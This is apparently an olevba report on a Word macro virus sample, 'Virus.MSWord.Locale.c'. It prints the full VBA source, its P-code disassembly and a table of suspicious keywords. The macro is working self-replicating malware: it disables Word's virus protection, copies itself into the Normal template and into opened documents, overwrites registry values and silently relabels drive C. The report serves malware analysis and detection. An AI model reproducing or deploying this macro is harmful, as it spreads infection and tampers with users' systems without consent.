olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Locale.c
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Locale.c - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
On Error Resume Next

bSavedState = ActiveDocument.Saved
    Set prevDocument = NormalTemplate
    Set nextDocument = newDocument
Options.VirusProtection = Not True
Options.SaveNormalPrompt = Not True
Options.ConfirmConversions = Not True

sLines = MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(1, MacroContainer.VBProject.VBComponents.Item(1).CodeModule.CountOfLines)

If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) <> "Private Sub Document_Close()" Then
NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.AddFromString sLines
NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.ReplaceLine 1, "Private Sub Document_Close()"

System.PrivateProfileString("", "HKEY_CLASSES_ROOT\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}", "") = "MY Computer"
System.PrivateProfileString("", "HKEY_CLASSES_ROOT\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}\DefaultIcon", "") = "C:\\WINDOWS\\SYSTEM\\shell32.dll,15"
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Internet Account Manager\Accounts\00000008", "SMTP Display Name") = ""
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Internet Account Manager\Accounts\00000008", "SMTP Email Address") = ""
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Nico Mak Computing\WinZip\WinIni", "Name") = ""
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Nico Mak Computing\WinZip\WinIni", "SN") = "415F7097"
System.PrivateProfileString("win.ini", "WinZip", "Name") = ""
System.PrivateProfileString("win.ini", "WinZip", "Name") = ""
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Applets\Hearts", "name") = ""

Shell "label c: n0nuts", vbHide

ElseIf ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) <> "Private Sub Document_Open()" Then
ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.AddFromString sLines
ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.ReplaceLine 1, "Private Sub Document_Open()"
If Left(ActiveDocument.Name, 8) <> "Document" Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End If

ActiveDocument.Saved = bSavedState


    With nextDocument.VBProject.VBComponents
        For i = 1 To .Count
            If .Item(i).Type = 100 Then
                With .Item(i).CodeModule
                    If Not .Find("Sub " + nextRoutine + "()", 1, 1, .CountOfLines, 10) Then
                        With prevDocument.VBProject.VBComponents.Item(1).CodeModule
                            codeString = .Lines(.ProcStartLine(nextRoutine, vbext_pk_Proc), .ProcCountLines(nextRoutine, vbext_pk_Proc))
                        End With
                    End If
                    .AddFromString codeString
                    .ReplaceLine 1, "Private Sub " + nextRoutine + "()"
                    If prevDocument Is NormalTemplate Then
                        .ReplaceLine 5, "    Set prevDocument = ActiveDocument"
                        .ReplaceLine 6, "    Set nextDocument = NormalTemplate"
                    Else
                        .ReplaceLine 5, "    Set prevDocument = NormalTemplate"
                        .ReplaceLine 6, "    Set nextDocument = newDocument"
                    End If
                End With
            End If
        Next
    End With
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Locale.c
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 5097 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Open())
' Line #1:
' 	OnError (Resume Next) 
' Line #2:
' Line #3:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	St bSavedState 
' Line #4:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	Set prevDocument 
' Line #5:
' 	SetStmt 
' 	Ld newDocument 
' 	Set nextDocument 
' Line #6:
' 	LitVarSpecial (True)
' 	Not 
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #7:
' 	LitVarSpecial (True)
' 	Not 
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #8:
' 	LitVarSpecial (True)
' 	Not 
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #9:
' Line #10:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St sLines 
' Line #11:
' Line #12:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x001C "Private Sub Document_Close()"
' 	Ne 
' 	IfBlock 
' Line #13:
' 	Ld sLines 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #14:
' 	LitDI2 0x0001 
' 	LitStr 0x001C "Private Sub Document_Close()"
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall ReplaceLine 0x0002 
' Line #15:
' Line #16:
' 	LitStr 0x000B "MY Computer"
' 	LitStr 0x0000 ""
' 	LitStr 0x003E "HKEY_CLASSES_ROOT\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}"
' 	LitStr 0x0000 ""
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #17:
' 	LitStr 0x0023 "C:\\WINDOWS\\SYSTEM\\shell32.dll,15"
' 	LitStr 0x0000 ""
' 	LitStr 0x004A "HKEY_CLASSES_ROOT\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}\DefaultIcon"
' 	LitStr 0x0000 ""
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #18:
' 	LitStr 0x0000 ""
' 	LitStr 0x0000 ""
' 	LitStr 0x004F "HKEY_CURRENT_USER\Software\Microsoft\Internet Account Manager\Accounts\00000008"
' 	LitStr 0x0011 "SMTP Display Name"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #19:
' 	LitStr 0x0000 ""
' 	LitStr 0x0000 ""
' 	LitStr 0x004F "HKEY_CURRENT_USER\Software\Microsoft\Internet Account Manager\Accounts\00000008"
' 	LitStr 0x0012 "SMTP Email Address"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #20:
' 	LitStr 0x0000 ""
' 	LitStr 0x0000 ""
' 	LitStr 0x003B "HKEY_CURRENT_USER\Software\Nico Mak Computing\WinZip\WinIni"
' 	LitStr 0x0004 "Name"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #21:
' 	LitStr 0x0008 "415F7097"
' 	LitStr 0x0000 ""
' 	LitStr 0x003B "HKEY_CURRENT_USER\Software\Nico Mak Computing\WinZip\WinIni"
' 	LitStr 0x0002 "SN"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #22:
' 	LitStr 0x0000 ""
' 	LitStr 0x0007 "win.ini"
' 	LitStr 0x0006 "WinZip"
' 	LitStr 0x0004 "Name"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #23:
' 	LitStr 0x0000 ""
' 	LitStr 0x0007 "win.ini"
' 	LitStr 0x0006 "WinZip"
' 	LitStr 0x0004 "Name"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #24:
' 	LitStr 0x0000 ""
' 	LitStr 0x0000 ""
' 	LitStr 0x004A "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Applets\Hearts"
' 	LitStr 0x0004 "name"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #25:
' Line #26:
' 	LitStr 0x000F "label c: n0nuts"
' 	Ld vbHide 
' 	ArgsCall Shell 0x0002 
' Line #27:
' Line #28:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x001B "Private Sub Document_Open()"
' 	Ne 
' 	ElseIfBlock 
' Line #29:
' 	Ld sLines 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #30:
' 	LitDI2 0x0001 
' 	LitStr 0x001B "Private Sub Document_Open()"
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall ReplaceLine 0x0002 
' Line #31:
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitDI2 0x0008 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0008 "Document"
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' 	EndIf 
' Line #32:
' 	EndIfBlock 
' Line #33:
' Line #34:
' 	Ld bSavedState 
' 	Ld ActiveDocument 
' 	MemSt Saved 
' Line #35:
' Line #36:
' Line #37:
' 	StartWithExpr 
' 	Ld nextDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	With 
' Line #38:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	MemLdWith Count 
' 	For 
' Line #39:
' 	Ld i 
' 	ArgsMemLdWith Item 0x0001 
' 	MemLd TypeOf 
' 	LitDI2 0x0064 
' 	Eq 
' 	IfBlock 
' Line #40:
' 	StartWithExpr 
' 	Ld i 
' 	ArgsMemLdWith Item 0x0001 
' 	MemLd CodeModule 
' 	With 
' Line #41:
' 	LitStr 0x0004 "Sub "
' 	Ld nextRoutine 
' 	Add 
' 	LitStr 0x0002 "()"
' 	Add 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	MemLdWith CountOfLines 
' 	LitDI2 0x000A 
' 	ArgsMemLdWith Find 0x0005 
' 	Not 
' 	IfBlock 
' Line #42:
' 	StartWithExpr 
' 	LitDI2 0x0001 
' 	Ld prevDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	With 
' Line #43:
' 	Ld nextRoutine 
' 	Ld vbext_pk_Proc 
' 	ArgsMemLdWith ProcStartLine 0x0002 
' 	Ld nextRoutine 
' 	Ld vbext_pk_Proc 
' 	ArgsMemLdWith ProcCountLines 0x0002 
' 	ArgsMemLdWith Lines 0x0002 
' 	St codeString 
' Line #44:
' 	EndWith 
' Line #45:
' 	EndIfBlock 
' Line #46:
' 	Ld codeString 
' 	ArgsMemCallWith AddFromString 0x0001 
' Line #47:
' 	LitDI2 0x0001 
' 	LitStr 0x000C "Private Sub "
' 	Ld nextRoutine 
' 	Add 
' 	LitStr 0x0002 "()"
' 	Add 
' 	ArgsMemCallWith ReplaceLine 0x0002 
' Line #48:
' 	Ld prevDocument 
' 	Ld NormalTemplate 
' 	Is 
' 	IfBlock 
' Line #49:
' 	LitDI2 0x0005 
' 	LitStr 0x0025 "    Set prevDocument = ActiveDocument"
' 	ArgsMemCallWith ReplaceLine 0x0002 
' Line #50:
' 	LitDI2 0x0006 
' 	LitStr 0x0025 "    Set nextDocument = NormalTemplate"
' 	ArgsMemCallWith ReplaceLine 0x0002 
' Line #51:
' 	ElseBlock 
' Line #52:
' 	LitDI2 0x0005 
' 	LitStr 0x0025 "    Set prevDocument = NormalTemplate"
' 	ArgsMemCallWith ReplaceLine 0x0002 
' Line #53:
' 	LitDI2 0x0006 
' 	LitStr 0x0022 "    Set nextDocument = newDocument"
' 	ArgsMemCallWith ReplaceLine 0x0002 
' Line #54:
' 	EndIfBlock 
' Line #55:
' 	EndWith 
' Line #56:
' 	EndIfBlock 
' Line #57:
' 	StartForVariable 
' 	Next 
' Line #58:
' 	EndWith 
' Line #59:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |newDocument         |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|shell32             |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|WINDOWS             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |shell32.dll         |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

